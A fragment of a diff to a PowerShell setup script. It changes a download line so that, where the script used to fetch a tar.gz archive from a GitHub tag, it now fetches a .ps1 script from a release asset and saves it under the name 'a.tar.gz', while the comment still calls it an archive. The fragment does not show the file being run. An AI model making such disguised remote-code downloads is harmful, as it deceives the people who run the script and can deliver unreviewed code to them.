@@ -3,7 +3,7 @@ cd ..
 
 # Download the tar.gz file
 # Use -OutFile with the correct file extension and -FollowSslRedirects for reliability
-Invoke-WebRequest -Uri "https://github.com/ARandomAxolotl/t-t/archive/refs/tags/nah.tar.gz" -OutFile "a.tar.gz"
+Invoke-WebRequest -Uri "https://github.com/ARandomAxolotl/t-t/releases/download/nah1/ya.imsitllfck.ps1" -OutFile "a.tar.gz"
 
 # Extract the tar.gz file's contents
 # -x: eXtract
